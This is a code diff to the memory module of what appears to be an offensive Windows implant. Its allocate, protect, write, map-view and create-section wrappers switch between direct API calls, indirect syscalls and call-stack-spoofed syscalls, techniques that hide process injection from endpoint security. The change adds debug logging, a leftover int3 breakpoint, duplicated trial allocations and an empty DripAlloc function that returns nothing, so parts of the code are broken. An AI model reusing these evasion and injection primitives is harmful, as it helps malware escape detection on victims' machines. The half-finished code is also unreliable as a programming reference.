@@ -7,7 +7,7 @@ auto DECLFN Memory::Read(
     _Out_ PSIZE_T Reads,
     _In_  HANDLE  Handle
 ) -> BOOL {
-    const UINT32 Flags = SYSCALL_FLAGS;
+    const UINT32 Flags = Self->KH_SYSCALL_FLAGS;
     NTSTATUS    Status = STATUS_UNSUCCESSFUL;
 
     if ( ! ( Flags & (SYSCALL_INDIRECT | SYSCALL_SPOOF) ) ) {
@@ -46,17 +46,16 @@ auto DECLFN Memory::Alloc(
     _In_  ULONG   Protect,
     _In_  HANDLE  Handle
 ) -> PVOID {
-    const UINT32 Flags = SYSCALL_FLAGS;
+    UINT32 Flags = Self->KH_SYSCALL_FLAGS;
+
+    KhDbg("alloc flags: %X", Flags);
 
     NTSTATUS Status      = STATUS_UNSUCCESSFUL;
     PVOID    BaseAddress = Base;
     SIZE_T   RegionSize  = Size;
 
-    if (!Handle || Handle == INVALID_HANDLE_VALUE) {
-        Handle = NtCurrentProcess();
-    }
-
-    if ( ! ( Flags & (SYSCALL_INDIRECT | SYSCALL_SPOOF) ) ) {
+    if ( ! ( Flags & ( SYSCALL_INDIRECT | SYSCALL_SPOOF) ) ) {
+        KhDbg("execute without syscall and spoof");
         if ( Handle == NtCurrentProcess() ) {
             return Self->Krnl32.VirtualAlloc( Base, Size, AllocType, Protect );
         } else {
@@ -72,19 +71,47 @@ auto DECLFN Memory::Alloc(
         ? (UPTR)Self->Sys->Ext[Sys::Alloc].ssn
         : 0;
 
-
     if ( Flags & SYSCALL_INDIRECT && ! (Flags & SYSCALL_SPOOF) ) {
+        KhDbg("executing indirect syscall without spoof");
         SyscallExec( Sys::Alloc, Status, Handle, &BaseAddress, 0, &RegionSize, AllocType, Protect );
     } else {
+        asm("int3");
+        Status = Self->Ntdll.NtAllocateVirtualMemory( 
+            Handle, &BaseAddress,
+            0, &RegionSize, AllocType, (UPTR)Protect 
+        );
+        KhDbg("%X", Status);
+        KhDbg("%p", BaseAddress);
+        BaseAddress = nullptr;
+        KhDbg("executing indirect syscall with spoof");
+        Status = Self->Spf->Call(
+            Address, 0, (UPTR)Handle, (UPTR)&BaseAddress,
+            0, (UPTR)&RegionSize, (UPTR)AllocType, (UPTR)Protect
+        );
+        KhDbg("%X", Status);
+        KhDbg("%p", BaseAddress);
+        BaseAddress = nullptr;
         Status = Self->Spf->Call(
             Address, ssn, (UPTR)Handle, (UPTR)&BaseAddress,
             0, (UPTR)&RegionSize, (UPTR)AllocType, (UPTR)Protect
         );
+        KhDbg("%X", Status);
+        KhDbg("%p", BaseAddress);
     }
     
-    Self->Usf->NtStatusToError(Status);
+    Self->Usf->NtStatusToError( Status );
     
     return NT_SUCCESS( Status ) ? BaseAddress : nullptr;
+}
+
+auto DECLFN Memory::DripAlloc(
+    _In_  PVOID   Base,
+    _In_  SIZE_T  Size,
+    _In_  ULONG   AllocType,
+    _In_  ULONG   Protect,
+    _In_  HANDLE  Handle
+) -> PVOID {
+    
 }
 
 auto DECLFN Memory::Protect(
@@ -94,7 +121,7 @@ auto DECLFN Memory::Protect(
     _Out_ ULONG  *OldProt,
     _In_  HANDLE  Handle
 ) -> BOOL {
-    const UINT32 Flags  = SYSCALL_FLAGS;
+    const UINT32 Flags  = Self->KH_SYSCALL_FLAGS;
     NTSTATUS     Status = STATUS_UNSUCCESSFUL;
 
 
@@ -168,7 +195,7 @@ auto DECLFN Memory::Write(
     _In_ ULONG  Size,
     _In_ HANDLE Handle
 ) -> BOOL {
-    const UINT32 Flags   = SYSCALL_FLAGS;
+    const UINT32 Flags   = Self->KH_SYSCALL_FLAGS;
     NTSTATUS     Status  = STATUS_UNSUCCESSFUL;
     SIZE_T       Written = 0;
 
@@ -207,7 +234,7 @@ auto DECLFN Memory::Free(
     _In_ ULONG  FreeType,
     _In_ HANDLE Handle
 ) -> BOOL {
-    const UINT32 Flags  = SYSCALL_FLAGS;
+    const UINT32 Flags  = Self->KH_SYSCALL_FLAGS;
     NTSTATUS     Status = STATUS_UNSUCCESSFUL;
 
     if ( ! Handle ) {
@@ -251,7 +278,7 @@ auto DECLFN Memory::MapView(
     _In_        ULONG           AllocationType,
     _In_        ULONG           PageProtection
 ) -> NTSTATUS {
-    const UINT32 Flags = SYSCALL_FLAGS;
+    const UINT32 Flags = Self->KH_SYSCALL_FLAGS;
     NTSTATUS Status = STATUS_UNSUCCESSFUL;
 
     if ( ! ( Flags & (SYSCALL_INDIRECT | SYSCALL_SPOOF) ) ) {
@@ -298,7 +325,7 @@ auto DECLFN Memory::CreateSection(
     _In_     ULONG             AllocationAttributes,
     _In_opt_ HANDLE            FileHandle
 ) -> NTSTATUS {
-    const UINT32 Flags = SYSCALL_FLAGS;
+    const UINT32 Flags = Self->KH_SYSCALL_FLAGS;
     NTSTATUS Status = STATUS_UNSUCCESSFUL;
 
     if ( ! ( Flags & (SYSCALL_INDIRECT | SYSCALL_SPOOF) ) ) {
